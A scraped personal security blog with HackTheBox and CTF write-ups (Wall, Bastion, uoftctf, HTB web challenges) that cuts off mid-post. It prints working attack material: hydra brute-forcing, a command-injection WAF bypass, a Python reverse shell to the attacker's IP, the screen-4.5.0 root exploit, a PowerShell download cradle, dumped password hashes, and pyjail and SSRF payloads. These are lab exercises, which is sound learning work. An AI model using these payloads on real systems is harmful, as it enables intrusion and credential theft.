二，网页目录爆破我比较喜欢用gobuster，来进行目录爆破。如果没有 请自行安装 sudo apt-get install gobuster1 我常用的字典是用 directory-list-2.3-medium.txt找到目录 &#x2F;monitoring 发现有个HTTP基础认证(HTTP Basic Authentication) 三，对基础认证进行试验由于gobuster 没有扫到什么其他目录，于是我把目标放在这基础认证。 首先我尝试是否可以hydra 来进行爆破密码。 hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-get /monitoring -t 301 如何使用hydra 我就不仔细教学了，这里有一篇很好的文章讲解各种hydra 选项传送门 hydra跑完后 我还是没有拿到密码。于是我把 http-get 换成 http-post 尝试 hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-post /monitoring -t 301 有意思的是居然每一个密码都能通过。现在我们可以尝试使用burp suite更改请求。从GET换去POST。然后我们被跳转到 &#x2F;centreon 这里简单的抓包下看 登陆的过程。 有ANTI-CSRF TOKEN所以没办法爆破。我们从登陆页面发现centreon 版本为 v.19.04.0 edb链接 四，修改Exploit先来聊聊这个exploit 的 python文件都干了什么。这个exploit 有两个部分，一个是登陆 一个是利用了命令注入 登陆的部分利用beautiful soup来抓去页面的 token。然后利用提供的API进行登陆。那么有意思的地方就在这里我们是不是可以稍微修改下 让这部分变成密码爆破。这里默认帐号是 admin 密码字典为 rockyou.txt import requestsimport sysimport warningsfrom bs4 import BeautifulSoupwith open(&quot;/usr/share/wordlists/rockyou.txt&quot;,&quot;r&quot;) as dict: for password in dict: request = requests.session() print(&quot;[+] Retrieving CSRF token to submit the login form&quot;) page = request.get(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;) html_content = page.text soup = BeautifulSoup(html_content) token = soup.findAll(&#x27;input&#x27;)[3].get(&quot;value&quot;) login_info = &#123; &quot;useralias&quot;: &quot;admin&quot;, &quot;password&quot;: password.strip(), &quot;submitLogin&quot;: &quot;Connect&quot;, &quot;centreon_token&quot;: token &#125; login_request = request.post(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;, login_info) print(login_info) if &quot;Your credentials are incorrect.&quot; not in login_request.text: print(&quot;[+] Crackedddddddddddddddddd password = &#123;0&#125;&quot;.format(password.strip())) break12345678910111213141516171819202122232425 执行后大约过了十几秒 我们成功取得密码（这密码也太弱了）admin:password1 五，绕过WAF现在我们有了密码和帐号，我可以来实验看看原版的POC能不能让我们直接取得Shell。 python 47069.py http://10.10.10.157/centreon admin password1 10.10.14.22 443nc -nvlp 44312 一点动静都没有！没事 让我们仔细读读第二个部分的命令注入 我们可以手动注入命令！ 从exploit 上可以得知 nagios_bin 这选项可以让我们直接执行远程命令 想更了解这个Exploit形成的可以看作者的帖子 传送门访问URL后并且用burp suite抓包 然后 ctrl+r 发去repeater手动进行更换 一般遇上可以远程执行命令的问题时可以尝试用ping wget curl 来判断是否可以远程执行。因为这些命令都会与本地进行交互 并且可以查询到记录。 首先 先测试能不能pingnagios_bin&#x3D;ping+10.10.14.12(自己KALI的IP)然后在本地上开启tcpdump来监听ICMP用 -i 来选择监听的interface tcpdump -i tun0 icmp1 搭建好环境后 选择send，结果却是forbidden 403。无法访问，这里就是“墙” 出现的地方了。 这时候我们可以手动到页面进行测试，从a~z 然后各种符号。最终发现任何字母都没问题，除了 空格会触发 403 forbidden。我们可以用 ${IFS} 来代替空格。 结果tcpdump 还是没有任何结果。没关系，为了更进一步实验 我们可以尝试 wget。打开一个web 服务（可以使用service apache2 start 或者 python3 -m http.server 80） “nagios_bin”: “wget${IFS}10.10.14.12” 我们成功从发现了 log 里面返回了 wall 向本地抓去index.php证实了 命令注入可以经过一番折腾， 上传了各种php,bash shell。只有python shell可以使用上传后，利用python 执行 python shell文件。 import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.14.12&quot;,443)) //替换这里成你的ip和端口os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(&quot;/bin/bash&quot;)1234567891011 六，提权提权相对容易发现。首先查看 SUID文件。发现可疑的 screen-4.5.0 find / -perm -4000 2&gt;/dev/null1 谷歌一下 发现了提权漏洞 传送门 个人习惯看到这种需要编译的漏洞都喜欢在本地编译好了再传输过去。直接执行这文件会出现未知错误。保险起见 我们手动把操作 #!/bin/bashecho &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123; chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!/n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123; setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne &quot;/x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... /tmp/rootshell123456789101112131415161718192021222324252627282930313233343536 手动操作好后 会出现两个文件 利用wget 传输到 &#x2F;tmp然后 cd /etcumask 000screen -D -m -L ld.so.preload echo -ne &quot;/x0a/tmp/libhax.so&quot;然后执行 /tmp/rootshell1234","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Bastion Writeup","slug":"HTB-bastion","date":"2020-01-09T16:00:00.000Z","updated":"2023-11-29T13:14:49.879Z","comments":true,"path":"2020/01/10/HTB-bastion/","permalink":"https://ik0nw.github.io/2020/01/10/HTB-bastion/","excerpt":"","text":"攻击机：官方Kali linux 2019 64位作者: Ikonw 一，端口扫描 正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。 二，SMB Enumeration首先，利用smbclient 连接到靶机方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。 smbclient -L //10.10.10.134 发现四个目标，其中三个是比较正常。有意思的是 Backups 我们利用smbclient 看看是否允许我们连接到 Backups smbclient \\\\\\\\10.10.10.134\\\\Backups 这里利用””来 逃脱 “” 所以需要4个，而backup 两个。 成功进入，发现三个文件。利用 get 把 note.txt 下载到本地。大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。按照文件夹的名字来看，应该是windows镜像的备份。 于是我尝试将整个backup都挂载到本地。在本地创建文件夹 &#x2F;mnt&#x2F;backup mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw 挂载到本地并且允许读写操作 7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件(文件较大 大概2分钟左右， 文件较多就只展示一部分） 7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd 可以看到这是几乎整个windows的备份。既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢 三，用户帐号密码7z 只是让我们看到了文件，而不能看到内容。我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。linux的 ghostmount 能让我们进入虚拟硬盘的文件 链接: 文章地址 跟着大哥走首先我们需要安装 libguestfs-tools这个库 apt-get install libguestfs-tools 简单的安装后，我们创建一个新的文件夹 &#x2F;mnt&#x2F;vhd 把vhd挂载在 这个文件夹 guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6 可以看到已经可以进入到 vhd文件里进行操作。我首先要做的就是能不能直接到user desktop里拿到 user.txt samdump2可以完成这个任务 关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。个人原因 我比较喜欢尝试破解密码 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::123 注意这边 administrator和 Guest显得的是 disable正常来说格式是&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;Administrator和guest的 LM HASH和NT hash都是一模一样。这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值题外话。 我们把L4mpje 的哈希值丢到crackstation.net 进行破解得到帐号密码L4mpje：bureaulampje 很可惜 我们没有 RDP， 但我们有SSH（狗头） ssh L4mpje@10.10.10.134password: bureaulampje12 成功拿到 cmd shell现在开始准备提权。碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。 链接: Jawl github地址 因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件其实方式有很多种，有的情况这个可以 有的情况那个可以我就简单说一下 我个人喜爱的一个方法。powershell powershell.exe -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.12/jaws-enum.ps1&#x27;,&#x27;C:\\Users\\L4mpje\\Desktop\\jaws-enum.ps1&#x27;)12 题外话结束 执行jaws-enum.ps1 powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps11 大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注mRemoteNG 四，提权碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。 链接:文章传送门 这里再说点题外话。Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹 利用 dir&#x2F;a 来显示全部的文件 成功找到管理员的密码 利用github上面的一个python 脚本 来算出密码 链接:github传送门 python3 mremote_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;成功取得密码thXLHM96BeKL0ER21234 紧接着 SSH登陆管理员 并拿到root.txt","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"CTF - uoftctf","slug":"CTF - uoftctf","date":"2007-12-30T16:00:00.000Z","updated":"2024-02-05T15:26:54.399Z","comments":true,"path":"2007/12/31/CTF - uoftctf/","permalink":"https://ik0nw.github.io/2007/12/31/CTF%20-%20uoftctf/","excerpt":"","text":"Jail - Baby’s First PyJail @windex told me that jails should be sourceless. So no source for you. Certain words are filtered &#39;import&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;os&#39;, &#39;open&#39;, &#39;read&#39;, &#39;system&#39;, &#39;module&#39;, &#39;write&#39;, &#39;.&#39; By printing the __builtins__ &gt;&gt;&gt; print(dir(__builtins__))[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EncodingWarning&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;aiter&#x27;, &#x27;all&#x27;, &#x27;anext&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;] We are still able to use getattr to access the object even though the import is banned. And manipulate the string to avoid the blacklist detections. The solution below avoids the black list character and dots. getattr(getattr(globals()[&#x27;__builtins__&#x27;], &#x27;__im&#x27;+&#x27;port__&#x27;)(&#x27;o&#x27;+&#x27;s&#x27;), &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;cat flag.txt&#x27;)Orgetattr(getattr(globals()[&#x27;__builtins__&#x27;], &#x27;__im&#x27;+&#x27;port__&#x27;)(&#x27;o&#x27;+&#x27;s&#x27;), &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;cat flag&#x27;) https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html https://www.freebuf.com/articles/web/326406.html. Web - Voice Changer I made a cool app that changes your voice. It’s a web application to record voice and sent over to server side and will parse by ffmpeg. During the analyse phase using burp, the pitch parameter found to be vulnerable to command injections and the result is return back in the output. Web - The Varsity Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue. Source code is provided, basically after user register, it allows user to view articles. According to the source code, the flag is stored at article 10 However viewing the article 10 requires subscription which the roles is embedded in JWT. In this part of code, it provides the POST route for /article. app.post(&quot;/article&quot;, (req, res) =&gt; &#123; const token = req.cookies.token; if (token) &#123; try &#123; const decoded = jwt.verify(token, JWT_SECRET); let issue = req.body.issue; if (req.body.issue &lt; 0) &#123; return res.status(400).json(&#123; message: &quot;Invalid issue number&quot; &#125;); &#125; if (decoded.subscription !== &quot;premium&quot; &amp;&amp; issue &gt;= 9) &#123; return res .status(403) .json(&#123; message: &quot;Please subscribe to access this issue&quot; &#125;); &#125; issue = parseInt(issue); if (Number.isNaN(issue) || issue &gt; articles.length - 1) &#123; return res.status(400).json(&#123; message: &quot;Invalid issue number&quot; &#125;); &#125; return res.json(articles[issue]); .................. It seems that there’s some problem with the parseInt. Before parseInt, issue have to be less than 9 and after the parseInt we need issue to be less than 10. After some research we found that using the scientific notation able us to meet the condition. when the value of issue is we will craft the issue to be &quot;9.999e-1&quot; which will bypass the first check and after parseint the value of issues will be 9. Since the value issue now is 9, it will also bypass the second check, and return res.json(article[9]) Web - No Codefrom flask import Flask, request, jsonifyimport reapp = Flask(__name__)@app.route(&#x27;/execute&#x27;, methods=[&#x27;POST&#x27;])def execute_code(): code = request.form.get(&#x27;code&#x27;, &#x27;&#x27;) if re.match(&quot;.*[\\x20-\\x7E]+.*&quot;, code): return jsonify(&#123;&quot;output&quot;: &quot;jk lmao no code&quot;&#125;), 403 result = &quot;&quot; try: result = eval(code) except Exception as e: result = str(e) return jsonify(&#123;&quot;output&quot;: result&#125;), 200if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) re.match(&quot;.*[\\x20-\\x7E]+.*&quot;, code) This regex is using the re.match() function to check if the code string contains any printable ASCII characters. Let’s break down the components: .*: Matches any character (except for a newline) zero or more times. [\\x20-\\x7E]+: This is a character class that matches one or more characters within the hexadecimal range \\x20 (space) to \\x7E (tilde). This range represents the printable ASCII characters, including letters, digits, punctuation, and some special characters. By enter a new line will bypass the check of regex import requestspayload = &quot;\\n__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;url = &quot;https://uoftctf-no-code.chals.io/execute&quot;r = requests.post(url,data=&#123;&quot;code&quot;:payload&#125;)print(r.text) &#123;&quot;output&quot;:&quot;uoftctf&#123;r3g3x_3p1c_f41L_XDDD&#125;&quot;&#125;","categories":[],"tags":[]},{"title":"HTB Web Challenge","slug":"HTB-Web-Challenge","date":"1997-12-31T16:00:00.000Z","updated":"2024-03-22T04:06:25.618Z","comments":true,"path":"1998/01/01/HTB-Web-Challenge/","permalink":"https://ik0nw.github.io/1998/01/01/HTB-Web-Challenge/","excerpt":"","text":"Jscalc - EasyDescription In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑 Poking through the website found it uses eval(), in this case, it is vulnerable directly execute javascript codes Take a look at routes, the /api/calculate accept variable called ‘formula‘ and passed it to the calculatorHelp calculator for processing const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const router = express.Router();const Calculator = require(&#x27;../helpers/calculatorHelper&#x27;);const response = data =&gt; (&#123; message: data &#125;);router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/calculate&#x27;, (req, res) =&gt; &#123; let &#123; formula &#125; = req.body; if (formula) &#123; result = Calculator.calculate(formula); return res.send(response(result)); &#125; return res.send(response(&#x27;Missing parameters&#x27;));&#125;)module.exports = router;// ocd and it directly proceed with eval without sanitized the input jsmodule.exports = &#123; calculate(formula) &#123; try &#123; return eval(`(function() &#123; return $&#123; formula &#125; ;&#125;())`); &#125; catch (e) &#123; if (e instanceof SyntaxError) &#123; return &#x27;Something went wrong!&#x27;; &#125; &#125; &#125;&#125; Reading files with Node.js readFileSync can be used to read files. craft payload in one line would be require(&#x27;fs&#x27;).readFileSync(&#x27;../flag.txt&#x27;) However it seems to return an object. Modify the parameter for readFileSync to utf8 require(&#x27;fs&#x27;).readFileSync(&#x27;../flag.txt&#x27;,&#x27;utf8&#x27;) ProxyAsService - Easyapp.py app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;) 2 route blueprint proxy_api and debug ip:port/(proxy_api)ip:port/debug(debug) route.py from flask import Blueprint, request, Response, jsonify, redirect, url_forfrom application.util import is_from_localhost, proxy_reqimport random, osSITE_NAME = &#x27;reddit.com&#x27;proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)debug = Blueprint(&#x27;debug&#x27;, __name__)@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def proxy(): url = request.args.get(&#x27;url&#x27;) if not url: cat_meme_subreddits = [ &#x27;/r/cats/&#x27;, &#x27;/r/catpictures&#x27;, &#x27;/r/catvideos/&#x27; ] random_subreddit = random.choice(cat_meme_subreddits) return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit)) target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27; response, headers = proxy_req(target_url) return Response(response.content, response.status_code, headers.items())@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])@is_from_localhostdef debug_environment(): environment_info = &#123; &#x27;Environment variables&#x27;: dict(os.environ), &#x27;Request headers&#x27;: dict(request.headers) &#125; return jsonify(environment_info) Break down into 2 parts. in the default index route, if the url parameter is not provided in the request, it will be randomly assign a path to reddits. If the url is set in parameter, it will access the url through the proxy_req function @proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def proxy(): url = request.args.get(&#x27;url&#x27;) if not url: cat_meme_subreddits = [ &#x27;/r/cats/&#x27;, &#x27;/r/catpictures&#x27;, &#x27;/r/catvideos/&#x27; ] random_subreddit = random.choice(cat_meme_subreddits) return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit)) target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27; response, headers = proxy_req(target_url) return Response(response.content, response.status_code, headers.items()) utils.py In this utils.py states the restriction for proxy_req functions stated previously, it will check if the url parameter contains the restricted keywords in the RESTIRCTED_URLS list. It will then act as a proxy send a request and forward the response back to user. RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]def is_safe_url(url): for restricted_url in RESTRICTED_URLS: if restricted_url in url: return False return Truedef is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != &#x27;127.0.0.1&#x27;: return abort(403) return func(*args, **kwargs) return check_ipdef proxy_req(url): method = request.method headers = &#123; key: value for key, value in request.headers if key.lower() in [&#x27;x-csrf-token&#x27;, &#x27;cookie&#x27;, &#x27;referer&#x27;] &#125; data = request.get_data() response = requests.request( method, url, headers=headers, data=data, verify=False ) if not is_safe_url(url) or not is_safe_url(response.url): return abort(403) return response, headers From here, it clearly seems a SSRF challenge. But where is the flag? Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints @debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])@is_from_localhostdef debug_environment(): environment_info = &#123; &#x27;Environment variables&#x27;: dict(os.environ), &#x27;Request headers&#x27;: dict(request.headers) &#125; return jsonify(environment_info) It has to check if the request if is from localhost def is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != &#x27;127.0.0.1&#x27;: return abort(403) return func(*args, **kwargs) return check_ip Now the task seems clearer, we have to craft a SSRF attacks, targeted to the /debug/environment and leak the environment settings that contains the flag. Firstly, we have to bypass the restriction of RESTRICTED_LIST, it can be easily bypass by using decimal to represent IP address. Hacktrick also provided other methods that represent localhost Secondly, we cannot directly input the url point to endpoint as it will embedded a reddit infront of our provided user input. Therefore we can use @ to bypass that. Therefore the full payload will be http://&lt;ip&gt;:&lt;port&gt;?url=@2130706433:&lt;port&gt;/debug/environment The server side will interpreted as http://&lt;ip&gt;:&lt;port&gt;?url=reddit@2130706433:&lt;port&gt;/debug/environment However, one interesting thing is when I setup docker in my localhost. I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337) http://172.17.0.1:1337/?url=@2130706433:1337/debug/environment but to the real target, I have difficulties using the same port 32436. Suspect it is a mapping of ports when expose to public IPs. Therefore have to change the payload to port 1337 http://159.65.24.125:32436/?url=@0.0.0.0:1337/debug/environment RenderQuest - Easy You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck! From the description it seems like a Server Side Template Injection. In function getTpl It retrieve the page and render the page using html template. https://pkg.go.dev/html/template func (p RequestData) FetchServerInfo(command string) string &#123; out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output() if err != nil &#123; This function is able to execute system information. Finding a way to trigger this function. It looks complicated, but we can always use chatGPT to spawn a sample html page with the go lang template. &lt;!-- File name: index.tpl --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Sample Template&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Welcome!&lt;/h1&gt; &lt;p&gt;This is a sample GoLang HTML template page.&lt;/p&gt; &lt;!-- Here, you can include Go template syntax to render dynamic content --&gt; &lt;p&gt;Client IP: &#123;&#123;.ClientIP&#125;&#125;&lt;/p&gt; &lt;p&gt;User Agent: &#123;&#123;.ClientUA&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Hostname: &#123;&#123;.ServerInfo.Hostname&#125;&#125;&lt;/p&gt; &lt;p&gt;Server OS: &#123;&#123;.ServerInfo.OS&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Kernel Version: &#123;&#123;.ServerInfo.KernelVersion&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Memory: &#123;&#123;.ServerInfo.Memory&#125;&#125;&lt;/p&gt; &lt;p&gt;Location Information:&lt;/p&gt; &lt;ul&gt; &lt;li&gt;IP Version: &#123;&#123;.ClientIpInfo.IpVersion&#125;&#125;&lt;/li&gt; &lt;li&gt;IP Address: &#123;&#123;.ClientIpInfo.IpAddress&#125;&#125;&lt;/li&gt; &lt;li&gt;Latitude: &#123;&#123;.ClientIpInfo.Latitude&#125;&#125;&lt;/li&gt; &lt;li&gt;Longitude: &#123;&#123;.ClientIpInfo.Longitude&#125;&#125;&lt;/li&gt; &lt;li&gt;Country Name: &#123;&#123;.ClientIpInfo.CountryName&#125;&#125;&lt;/li&gt; &lt;li&gt;Country Code: &#123;&#123;.ClientIpInfo.CountryCode&#125;&#125;&lt;/li&gt; &lt;li&gt;Time Zone: &#123;&#123;.ClientIpInfo.TimeZone&#125;&#125;&lt;/li&gt; &lt;li&gt;Zip Code: &#123;&#123;.ClientIpInfo.ZipCode&#125;&#125;&lt;/li&gt; &lt;li&gt;City Name: &#123;&#123;.ClientIpInfo.CityName&#125;&#125;&lt;/li&gt; &lt;li&gt;Region Name: &#123;&#123;.ClientIpInfo.RegionName&#125;&#125;&lt;/li&gt; &lt;li&gt;Continent: &#123;&#123;.ClientIpInfo.Continent&#125;&#125;&lt;/li&gt; &lt;li&gt;Continent Code: &#123;&#123;.ClientIpInfo.ContinentCode&#125;&#125;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; Using web hook, paste the html template into the response. Great we can render the page. Next we can just edit to call the FetchServerInfo and we got the result total 10172drwxr-xr-x 1 root root 4096 Dec 17 12:54 .drwxr-xr-x 1 root root 4096 Dec 17 12:54 ..-rw-r--r-- 1 root root 4786 Sep 11 14:11 main.go-rwxr-xr-x 1 root root 10387927 Dec 17 12:54 renderquestdrwxr-xr-x 4 root root 4096 Sep 7 23:12 staticdrwxr-xr-x 2 root root 4096 Sep 7 23:12 templates Toxic - Easy Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸 In index.php if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))&#123; $page = new PageModel; $page-&gt;file = &#x27;/www/index.html&#x27;; setcookie( &#x27;PHPSESSID&#x27;, base64_encode(serialize($page)), time()+60*60*24, &#x27;/&#x27; );&#125; $cookie = 